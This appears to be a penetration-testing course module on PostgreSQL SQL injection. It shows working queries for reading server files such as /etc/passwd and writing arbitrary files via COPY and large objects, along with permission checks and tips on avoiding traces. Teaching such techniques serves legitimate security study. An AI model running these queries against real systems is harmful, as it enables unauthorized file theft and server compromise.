# Reading and Writing Files

## Introduction

Next, we will be looking at techniques we can use when exploiting`SQL injections`that specifically target`PostgreSQL`databases.

In this section, we'll take a look at two methods we can use for reading and writing files to and from the server, and then we'll cover an interactive example in`BlueBird`to practice.

## Method 1: COPY

The first method for interacting with files on the server via a`PostgreSQL injection`is making use of the built in[COPY](https://www.postgresql.org/docs/current/sql-copy.html)command. The intended use of this command is to import/export tables, but we can use it to read pretty much anything. The file operations run on the system as the`postgres`user though, so keep in mind that it's only possible to read/write files according to the user's permissions.

#### Reading Files

To read a file from the filesystem, we can use the`COPY FROM`syntax to`copy`data from a file into a table in the database. To make things easy, we can create a temporary table with one text column, copy the contents of our target file into it and then drop it after selecting the contents like this:

```
`bluebird=#CREATE TABLE tmp(t TEXT);CREATE TABLEbluebird=#COPY tmp FROM'/etc/passwd';COPY 59bluebird=#SELECT * FROM tmp LIMIT5;t                        
-------------------------------------------------
 root:x:0:0:root:/root:/usr/bin/zsh
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
 sync:x:4:65534:sync:/bin:/bin/sync
(5 rows)bluebird=#DROP TABLE tmp;DROP TABLE`
```

One issue with using`COPY`to read files, is that it expects data to be seperated into columns. By default it treats`\t`as a column, so if you try to read a file like`/etc/hosts`you will run into this error:

```
`bluebird=#COPY tmp FROM'/etc/hosts';ERROR:  extra data after last expected column
CONTEXT:  COPY tmp, line 1: "127.0.0.1  localhost"`
```

Unfortunately there is no perfect solution to getting around this, but what we can do is change the`delimiter`from`\t`to some character that is unlikely to appear in the data like this:

```
`bluebird=#COPY tmp FROM'/etc/hosts'DELIMITER E'\x07';COPY 7bluebird=#SELECT * FROM tmp;t                              
------------------------------------------------------------
 127.0.0.1       localhost
 127.0.1.1       kali#The following lines are desirableforIPv6 capable hosts::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
(7 rows)`
```

#### Writing Files

Writing files using`COPY`works very similarly- instead of`COPY FROM`we will use`COPY TO`to copy data from a table into a file. It is a good idea to use a temporary table to avoid leaving traces behind.

```
icantthinkofaname23@htb[/htb]`bluebird=#CREATE TABLE tmp(t TEXT);CREATE TABLEbluebird=#INSERT INTO tmp VALUES('To hack, or not to hack, that is the question');INSERT 0 1bluebird=#COPY tmp TO'/tmp/proof.txt';COPY 1bluebird=#DROP TABLE tmp;DROP TABLEbluebird=#exit$cat/tmp/proof.txtTo hack, or not to hack, that is the question`
```

Since all data is put into one column, there is no issue with delimiters when it comes to writing files.

#### Permissions

In order to use`COPY`to read/write files, the user must either have the[pg_read_server_files / pg_write_server_files](https://www.postgresql.org/docs/11/default-roles.html)role respectively, or be a superuser.

Checking if a user is a superuser is quite straightforward and can be easily tested in blind injection scenarios:

```
`bluebird=#SELECT current_setting('is_superuser');current_setting 
-----------------
 on
(1 row)`
```

Checking if a user has a specific role is not so simple. Locally we could run`\du`, but through an injection we would need something like:

```
`bluebird=#SELECT r.rolname, ARRAY(SELECT b.rolname FROM pg_catalog.pg_auth_members m JOIN pg_catalog.pg_roles b ON(m.roleid=b.oid)WHERE m.member=r.oid)as memberof FROM pg_catalog.pg_roles r WHERE r.rolname='fileuser';rolname  |        memberof        
----------+------------------------
 fileuser | {pg_read_server_files}
(1 row)`
```

## Method 2: Large Objects

The second method for dealing with files is with[large objects](https://www.postgresql.org/docs/current/largeobjects.html). This is a bit trickier than the`COPY`function, but at the same time it is a very powerful feature.

#### Reading Files

To read a file, we should first use`lo_import`to load the file into a new`large object`. This command should return the`object ID`of the large object which we will need to reference later on.

```
`bluebird=#SELECT lo_import('/etc/passwd');lo_import 
-----------
     16513
(1 row)`
```

Once the file is imported we should get an`object ID`. The file will be stored in the`pg_largeobjects`table as a hexstring. If the size of the file is larger than`2kB`, the`large object`will be split up into`pages`each`2kB`large (`4096`characters when hex encoded). We can get the contents with`lo_get(<object id>)`:

```
`bluebird=#SELECT lo_get(16513);<SNIP>\x726f6f743a783a303a303a726f6f743a2...<SNIP>`
```

Alternatively, you can select data directly from`pg_largeobject`, but this requires specifying the page numbers as well:

```
`bluebird=#SELECT data FROM pg_largeobject WHEREloid=16513ANDpageno=0;bluebird=#SELECT data FROM pg_largeobject WHEREloid=16513ANDpageno=1;<SNIP>`
```

Once we've obtained the hexstring, we can convert it back using`xxd`like this:

```
icantthinkofaname23@htb[/htb]`$echo726f6f743<SNIP> | xxd -r -p
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nolog
<SNIP>`
```

Unfortunately, it's not possible to specify an`object ID`when creating the large object, so it does make things harder if you are doing this blindly. One thing you could do is select all`object IDs`from the`pg_largeobject`table and figure out which one is yours:

```
`bluebird=#SELECT DISTINCT loid FROM pg_largeobject;loid  
-------
 16515
(1 row)`
```

#### Writing Files

Writing files using`large objects`is a very similar process. Essentially we will create a large object, insert hex-encoded data`2kb`at a time and then export the large object to a file on disk.

First we need to prepare the file we want to upload by splitting it up into`2kb`chunks:

```
icantthinkofaname23@htb[/htb]`$split-b2048/etc/passwd$ls-ltotal 8
-rw-r--r-- 1 kali kali 2048 Feb 25 06:52 xaa
-rw-r--r-- 1 kali kali 1328 Feb 25 06:52 xab`
```

We'll convert each chunk (`xaa,xab,...`) into hex-strings like this:

```
icantthinkofaname23@htb[/htb]`$xxd -ps -c99999999999xaa726f6f743a783a303a303a726<SNIP>`
```

Once that's ready, we can create a`large object`with a known`object ID`with`lo_create`, then insert the hex-encoded data one page at a time into`pg_largeobject`, export the`large object`by`object ID`to a specific path with`lo_export`and then finally delete the object from the database with`lo_unlink`.

```
icantthinkofaname23@htb[/htb]`bluebird=#SELECT lo_create(31337);lo_create 
-----------
     31337
(1 row)bluebird=#INSERT INTO pg_largeobject(loid, pageno, data)VALUES(31337,0, DECODE('726f6f74<SNIP>6269','HEX'));INSERT 0 1bluebird=#INSERT INTO pg_largeobject(loid, pageno, data)VALUES(31337,1, DECODE('6e2f626173<SNIP>96e0a','HEX'));INSERT 0 1bluebird=#SELECT lo_export(31337,'/tmp/passwd');lo_export 
-----------
         1
(1 row)bluebird=#SELECT lo_unlink(31337);lo_unlink 
-----------
         1
(1 row)bluebird=#exit$head/tmp/passwdroot:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin`
```

Depending on user permissions, the`INSERT`queries may fail. In that case you could try using`lo_put`as it is described in the[documentation](https://www.postgresql.org/docs/current/lo-funcs.html):

```
`bluebird=#SELECT lo_put(31337,0,'this is a test');lo_put 
--------
 
(1 row)`
```

#### Permissions

Any user can create or unlink large objects, but importing, exporting or updating the values require the user to either be a superuser, or to have explicit permissions granted. You may read more about this[here](https://www.postgresql.org/docs/current/lo-interfaces.html).
